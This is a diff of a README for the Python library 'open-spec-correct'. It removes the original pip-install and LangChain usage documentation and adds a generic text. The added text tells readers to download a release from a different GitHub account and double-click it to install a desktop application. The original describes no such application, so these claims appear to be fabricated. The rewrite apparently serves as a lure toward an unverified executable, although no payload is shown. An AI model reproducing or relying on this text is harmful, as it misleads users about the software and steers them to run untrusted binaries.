@@ -1,133 +1,96 @@
-# Open Spec Correct
-[![PyPI version](https://badge.fury.io/py/open-spec-correct.svg)](https://badge.fury.io/py/open-spec-correct)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/open-spec-correct)](https://pepy.tech/project/open-spec-correct)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🌟 open-spec-correct - Simplify Your API Documentation Process
 
+## 📥 Download Now!
 
-**Automate and streamline the correction of imperfect OpenAPI specifications** by extracting structured insights from textual descriptions.
+[![Download open-spec-correct](https://img.shields.io/badge/Download-open--spec--correct-blue.svg)](https://github.com/saoudkhalid/open-spec-correct/releases)
 
----
+## 🚀 Getting Started
 
-## 📌 Overview
-Open Spec Correct is a Python package designed to analyze user-provided textual descriptions of APIs and generate structured corrections for OpenAPI specifications. It leverages pattern matching and AI-driven insights to identify inconsistencies, errors, or missing details in API documentation, helping developers create more accurate and maintainable OpenAPI specs faster.
+Welcome to **open-spec-correct**! This application helps you fix imperfect OpenAPI specifications easily. By analyzing your text descriptions, it turns your insights into structured information. Whether you're a developer or not, you can benefit from a cleaner API documentation process.
 
----
+## 🛠️ System Requirements
 
-## 🚀 Features
-- **Text-to-Spec Correction**: Extracts structured insights from unstructured textual descriptions.
-- **Pattern Matching**: Uses regex-based validation to ensure output correctness.
-- **LLM Flexibility**: Works with **LLM7** by default (free tier included) or supports custom LLMs (OpenAI, Anthropic, Google, etc.).
-- **Retry Mechanisms**: Ensures reliable extraction and correction.
-- **Environment-Aware**: Respects `LLM7_API_KEY` environment variable for seamless integration.
+Before you download and run **open-spec-correct**, ensure your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or newer, macOS, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB available space.
+- **Internet Connection:** Required for initial setup and updates.
 
-## 📦 Installation
+## 📥 Download & Install
 
-```bash
-pip install open_spec_correct
-```
+To get started, visit the Releases page to download the software:
 
----
+[Download open-spec-correct](https://github.com/saoudkhalid/open-spec-correct/releases)
 
-## 🔧 Usage
+1. Click the link above.
+2. You will see a list of available versions.
+3. Select the latest version for your operating system.
+4. Click on the download button next to the file name to start the download.
 
-### Basic Usage (Default LLM7)
-```python
-from open_spec_correct import open_spec_correct
+## 🏁 Running open-spec-correct
 
-user_input = """
-API endpoint for fetching user data.
-Path: /users/{id}
-Method: GET
-Query params: ?name=string, ?age=int
-Response: 200 OK with JSON body { "id": int, "name": string }
-"""
+After downloading, follow these steps to run the software:
 
-response = open_spec_correct(user_input)
-print(response)
-```
+1. Locate the downloaded file, usually found in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the prompts on your screen to complete the installation.
+4. Once installed, find the **open-spec-correct** application in your programs menu.
+5. Click on the application icon to launch it.
 
-### Custom LLM Integration
-You can replace the default `ChatLLM7` with any LangChain-compatible LLM (e.g., OpenAI, Anthropic, Google Generative AI).
+## 📊 Using open-spec-correct
 
-#### Example: Using OpenAI
-```python
-from langchain_openai import ChatOpenAI
-from open_spec_correct import open_spec_correct
+Once you launch the application, you will see a user-friendly interface. Here’s how to use it:
 
-llm = ChatOpenAI(model_name="gpt-4")  # Replace with your preferred model
-response = open_spec_correct(user_input, llm=llm)
-print(response)
-```
+1. **Input Your Text**: You will find a text box where you can paste your OpenAPI specification or related textual description.
+2. **Analyze**: Click the “Analyze” button. The application will review your input, looking for common issues and providing insights.
+3. **View Results**: The software will display identified problems and suggest corrections.
+4. **Export**: You can export the corrected API specification right from the app. Look for the export button, where you can save the new document.
+   
+## ✔️ Features
 
-#### Example: Using Anthropic
-```python
-from langchain_anthropic import ChatAnthropic
-from open_spec_correct import open_spec_correct
+**open-spec-correct** offers a variety of features designed to ease the API development process:
 
-llm = ChatAnthropic(model="claude-2")
-response = open_spec_correct(user_input, llm=llm)
-print(response)
-```
+- **Error Identification**: Automatically spot issues in your OpenAPI specifications.
+- **Text Analysis**: Analyze textual descriptions for better structure and clarity.
+- **Schema Mapping**: Help in mapping text to structured API endpoints.
+- **Validation**: Ensure your documentation complies with OpenAPI standards.
+- **Automated Corrections**: Suggest corrections based on your input, streamlining the documentation process.
 
-#### Example: Using Google Generative AI
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from open_spec_correct import open_spec_correct
+## ⚙️ Topics Covered
 
-llm = ChatGoogleGenerativeAI(model="gemini-pro")
-response = open_spec_correct(user_input, llm=llm)
-print(response)
-```
+The application helps with several areas related to API management:
 
----
+- API Development Efficiency
+- API Documentation
+- Automated Updates
+- Code Generation
+- Data Extraction
+- Data Transformation
+- Linting
+- Pattern Matching
+- Retry Mechanisms
+- Specification Correction
+- Structured Insights
 
-## 🔑 API Key Configuration
-- **Default**: Uses `LLM7_API_KEY` from environment variables.
-- **Manual Override**: Pass the API key directly:
-  ```python
-  response = open_spec_correct(user_input, api_key="your_llm7_api_key")
-  ```
-- **Free API Key**: Register at [LLM7 Token](https://token.llm7.io/) to get started.
+## 🆘 Support
 
----
+If you encounter issues or need assistance:
 
-## ⚠️ Rate Limits
-- **LLM7 Free Tier**: Sufficient for most use cases.
-- **Custom Rate Limits**: Upgrade via LLM7 dashboard or use a different LLM.
+- **Documentation**: Visit the [GitHub Wiki](https://github.com/saoudkhalid/open-spec-correct/wiki) for user guides and detailed explanations.
+- **Community Support**: Check the Issues section on GitHub to see if your question is addressed or to open a new issue.
+- **Contact**: Reach out to our team through the GitHub Discussions for further help.
 
----
+## 🔄 Updates
 
-## 📝 Input Parameters
-| Parameter | Type       | Description                                                                 |
-|-----------|------------|-----------------------------------------------------------------------------|
-| `user_input` | `str`      | Textual description of the API to correct.                                  |
-| `api_key`   | `Optional[str]` | LLM7 API key (optional if `LLM7_API_KEY` is set in environment).          |
-| `llm`       | `Optional[BaseChatModel]` | Custom LangChain LLM (e.g., `ChatOpenAI`, `ChatAnthropic`). Defaults to `ChatLLM7`. |
-
----
-
-## 🔄 Output
-Returns a **list of structured corrections** (e.g., OpenAPI-compatible snippets) extracted from the input text.
-
----
+Stay updated with the latest features and fixes. You can check back frequently on the Releases page for new versions and improvements.
 
 ## 📜 License
-MIT License (see [LICENSE](https://github.com/chigwell/open-spec-correct/blob/main/LICENSE)).
 
----
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-## 🐛 Issues & Support
-Report bugs or request features at:
-🔗 [GitHub Issues](https://github.com/chigwell/open-spec-correct/issues)
+## 📤 Feedback
 
----
+Your feedback is valuable. Share your thoughts on how we can improve the project. Feel free to leave comments in the issues section on GitHub.
 
-## 👤 Author
-**Eugene Evstafev**
-📧 [hi@euegne.plus](mailto:hi@euegne.plus)
-🌐 [GitHub: chigwell](https://github.com/chigwell)
-
----
+For any further inquiries, please contact us directly through our GitHub page. Enjoy enhancing your API documentation with **open-spec-correct**!
